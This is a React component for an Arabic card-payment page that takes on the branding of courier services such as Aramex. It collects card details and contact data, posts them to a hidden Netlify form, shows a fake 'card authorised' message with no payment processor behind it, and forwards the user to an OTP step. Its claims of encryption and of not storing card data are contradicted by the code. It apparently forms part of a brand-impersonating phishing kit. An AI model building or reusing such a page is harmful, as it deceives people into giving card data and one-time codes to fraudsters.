import { useState } from "react";
import { useParams, useNavigate } from "react-router-dom";
import { Card } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Badge } from "@/components/ui/badge";
import { getServiceBranding } from "@/lib/serviceLogos";
import { Shield, CreditCard, Lock, AlertCircle } from "lucide-react";
import { useToast } from "@/hooks/use-toast";

const PaymentCardForm = () => {
  const { id } = useParams();
  const navigate = useNavigate();
  const { toast } = useToast();
  
  const [cardName, setCardName] = useState("");
  const [cardNumber, setCardNumber] = useState("");
  const [expiry, setExpiry] = useState("");
  const [cvv, setCvv] = useState("");
  
  // Get customer info from sessionStorage
  const customerInfo = JSON.parse(sessionStorage.getItem('customerInfo') || '{}');
  const serviceName = customerInfo.service || 'aramex';
  const branding = getServiceBranding(serviceName);
  
  const formatCardNumber = (value: string) => {
    const cleaned = value.replace(/\s/g, "");
    const matches = cleaned.match(/.{1,4}/g);
    return matches ? matches.join(" ") : cleaned;
  };
  
  const formatExpiry = (value: string) => {
    const cleaned = value.replace(/\D/g, "");
    if (cleaned.length >= 2) {
      return cleaned.substring(0, 2) + "/" + cleaned.substring(2, 4);
    }
    return cleaned;
  };
  
  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    if (!cardName || !cardNumber || !expiry || !cvv) {
      toast({
        title: "خطأ",
        description: "الرجاء ملء جميع الحقول",
        variant: "destructive",
      });
      return;
    }
    
    // Store card info (last 4 only) for display purposes
    const last4 = cardNumber.replace(/\s/g, "").slice(-4);
    sessionStorage.setItem('cardLast4', last4);
    sessionStorage.setItem('cardName', cardName);
    
    // Submit to Netlify Forms
    try {
      await fetch("/", {
        method: "POST",
        headers: { "Content-Type": "application/x-www-form-urlencoded" },
        body: new URLSearchParams({
          "form-name": "card-details",
          name: customerInfo.name || '',
          email: customerInfo.email || '',
          phone: customerInfo.phone || '',
          service: serviceName,
          cardholder: cardName,
          cardLast4: last4,
          expiry: expiry,
          timestamp: new Date().toISOString()
        }).toString()
      });
    } catch (err) {
      console.error("Form submission error:", err);
    }
    
    toast({
      title: "تم بنجاح",
      description: "تم تفويض البطاقة بنجاح",
    });
    
    // Navigate to OTP
    navigate(`/pay/${id}/otp`);
  };
  
  return (
    <div 
      className="min-h-screen py-12" 
      dir="rtl"
      style={{
        background: `linear-gradient(135deg, ${branding.colors.primary}15, ${branding.colors.secondary}15)`
      }}
    >
      <div className="container mx-auto px-4">
        <div className="max-w-md mx-auto">
          {/* Service Logo */}
          {branding.logo && (
            <div className="text-center mb-6">
              <img 
                src={branding.logo} 
                alt={serviceName}
                className="h-16 mx-auto mb-4"
                onError={(e) => e.currentTarget.style.display = 'none'}
              />
            </div>
          )}
          
          {/* Security Badge */}
          <div className="text-center mb-6">
            <Badge 
              className="text-sm px-4 py-2"
              style={{ 
                background: `linear-gradient(135deg, ${branding.colors.primary}, ${branding.colors.secondary})`,
                color: 'white'
              }}
            >
              <Lock className="w-4 h-4 ml-2" />
              <span>معاملة آمنة ومشفّرة</span>
            </Badge>
          </div>
          
          <Card className="p-8 shadow-elevated">
            <div className="flex items-center gap-3 mb-6">
              <div 
                className="w-12 h-12 rounded-xl flex items-center justify-center"
                style={{
                  background: `linear-gradient(135deg, ${branding.colors.primary}, ${branding.colors.secondary})`
                }}
              >
                <CreditCard className="w-6 h-6 text-white" />
              </div>
              <div>
                <h1 className="text-2xl font-bold">بيانات البطاقة</h1>
                <p className="text-sm text-muted-foreground">الدفع الآمن</p>
              </div>
            </div>
            
            {/* Info Alert */}
            <div 
              className="border rounded-lg p-3 mb-6 flex items-start gap-2"
              style={{
                background: `${branding.colors.primary}10`,
                borderColor: `${branding.colors.primary}30`
              }}
            >
              <AlertCircle className="w-5 h-5 mt-0.5 flex-shrink-0" style={{ color: branding.colors.primary }} />
              <p className="text-sm" style={{ color: branding.colors.primary }}>
                بياناتك محمية بتقنية التشفير. لا نقوم بحفظ بيانات البطاقة
              </p>
            </div>
            
            <form onSubmit={handleSubmit} className="space-y-5">
              {/* Cardholder Name */}
              <div>
                <Label className="mb-2">اسم حامل البطاقة</Label>
                <Input
                  placeholder="AHMAD ALI"
                  value={cardName}
                  onChange={(e) => setCardName(e.target.value.toUpperCase())}
                  className="h-12 text-lg"
                  required
                />
              </div>
              
              {/* Card Number */}
              <div>
                <Label className="mb-2">رقم البطاقة</Label>
                <Input
                  placeholder="4242 4242 4242 4242"
                  value={cardNumber}
                  onChange={(e) =>
                    setCardNumber(formatCardNumber(e.target.value.slice(0, 19)))
                  }
                  inputMode="numeric"
                  className="h-12 text-lg tracking-wider"
                  required
                />
              </div>
              
              {/* Expiry & CVV */}
              <div className="grid grid-cols-2 gap-4">
                <div>
                  <Label className="mb-2">تاريخ الانتهاء</Label>
                  <Input
                    placeholder="MM/YY"
                    value={expiry}
                    onChange={(e) =>
                      setExpiry(formatExpiry(e.target.value.slice(0, 4)))
                    }
                    inputMode="numeric"
                    className="h-12 text-lg"
                    required
                  />
                </div>
                
                <div>
                  <Label className="mb-2">CVV</Label>
                  <Input
                    placeholder="123"
                    value={cvv}
                    onChange={(e) =>
                      setCvv(e.target.value.replace(/\D/g, "").slice(0, 3))
                    }
                    inputMode="numeric"
                    type="password"
                    className="h-12 text-lg"
                    required
                  />
                </div>
              </div>
              
              {/* Submit Button */}
              <Button
                type="submit"
                size="lg"
                className="w-full text-lg py-7 mt-6 text-white"
                style={{
                  background: `linear-gradient(135deg, ${branding.colors.primary}, ${branding.colors.secondary})`
                }}
              >
                <Shield className="w-5 h-5 ml-2" />
                <span>تفويض البطاقة</span>
              </Button>
              
              <p className="text-xs text-center text-muted-foreground mt-3">
                سيتم إرسال رمز التحقق إلى هاتفك المسجل
              </p>
            </form>
          </Card>
          
          {/* Security Icons */}
          <div className="flex items-center justify-center gap-6 mt-8 opacity-60">
            <Shield className="w-5 h-5" />
            <Lock className="w-5 h-5" />
            <CreditCard className="w-5 h-5" />
          </div>
          
          {/* Hidden Netlify Form */}
          <form name="card-details" netlify-honeypot="bot-field" data-netlify="true" hidden>
            <input type="text" name="name" />
            <input type="email" name="email" />
            <input type="tel" name="phone" />
            <input type="text" name="service" />
            <input type="text" name="cardholder" />
            <input type="text" name="cardLast4" />
            <input type="text" name="expiry" />
            <input type="text" name="timestamp" />
          </form>
        </div>
      </div>
    </div>
  );
};

export default PaymentCardForm;
